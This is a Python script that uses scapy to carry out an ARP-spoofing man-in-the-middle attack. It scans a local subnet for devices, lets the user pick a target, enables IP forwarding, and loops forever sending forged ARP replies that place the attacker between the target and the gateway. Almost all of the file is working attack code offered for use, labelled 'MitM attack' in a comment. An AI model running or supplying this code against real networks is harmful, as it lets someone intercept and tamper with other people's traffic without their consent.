import subprocess
from time import sleep
import scapy.all as scapy
import os

#finding devices(targets) in the network 
def arping():
    
    print("Please wait...")

    biggest_res = []
    for _ in range(5):
        answered_lst = scapy.arping("192.168.100.0/24", verbose=0)[0]
        for i in answered_lst:
           
            if i not in biggest_res:
                biggest_res.append(i)
    print('\n')

    if len(biggest_res) == 0:
        print("there is no target in the network(make sure that you are connecter via wifi!!!)")

    elif len(biggest_res) > 0:
        for dev in biggest_res:
            print(f"{dev[1].psrc}:{dev[1].hwsrc} \n")
        return biggest_res
    else:
        raise ValueError

#MitM attack
def arp_spoof(gateway_ifno,target_ip,target_mac,arp_res):
    
    gateway_ip = None
    gateway_mac = None
    is_exists = False
    
    if arp_res == None :
        print("some thing went wrong!!!")
        exit()
    else:
        for dev in arp_res:
            
            for item in gateway_ifno:
                if dev[1].psrc in item:
                    gateway_ip = dev[1].psrc
                    gateway_mac = dev[1].hwsrc
            
            if dev[1].psrc == target_ip and dev[1].hwsrc == target_mac:
                is_exists = True
    
    if not is_exists:
        print("some thing went wrong!!!")
        exit()


    #for allowing ip forwarding
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"]) 
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])   

    '''
    in this function we tell router that we are the target(so server send us the packets instead of sending to target)
    and we tell target that we are router(so target send us the packets)
    '''
    while True:
        pkg = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=gateway_ip)
        scapy.send(pkg,verbose=False)
        pkg2 = scapy.ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,psrc=target_ip)
        scapy.send(pkg2,verbose=False)
        sleep(3)


def gateway_Info():
    res = subprocess.run(["route","-n"],capture_output=True)
    res = res.stdout.decode().split("\n")
    return res

def main():
    
    #ip forwarding needs root privileges
    if os.environ["USER"] != "root":
        print("You have to run program as root user")
    
    elif os.environ["USER"] == "root":
        gateway_info = gateway_Info()
        arp_res = arping()
        choose_target = input("print tragetip:mac --->(enter A for arp again) ")
        while choose_target == "A":
            arp_res = arping()
            choose_target = input("print tragetip:mac --->(enter A for arp again) ")
        
        
        try:
            target_ip = choose_target.split(":")[0]
        
            target_mac = choose_target.split(":")[1] + ":" + choose_target.split(":")[2] + ":" + choose_target.split(":")[3] + ":" + choose_target.split(":")[4] + ":" + choose_target.split(":")[5] + ":" + choose_target.split(":")[6]
            
        except:

            raise ValueError("unvalid data")

        arp_spoof(gateway_info,target_ip,target_mac,arp_res)
    
    else:
        exit()


main()
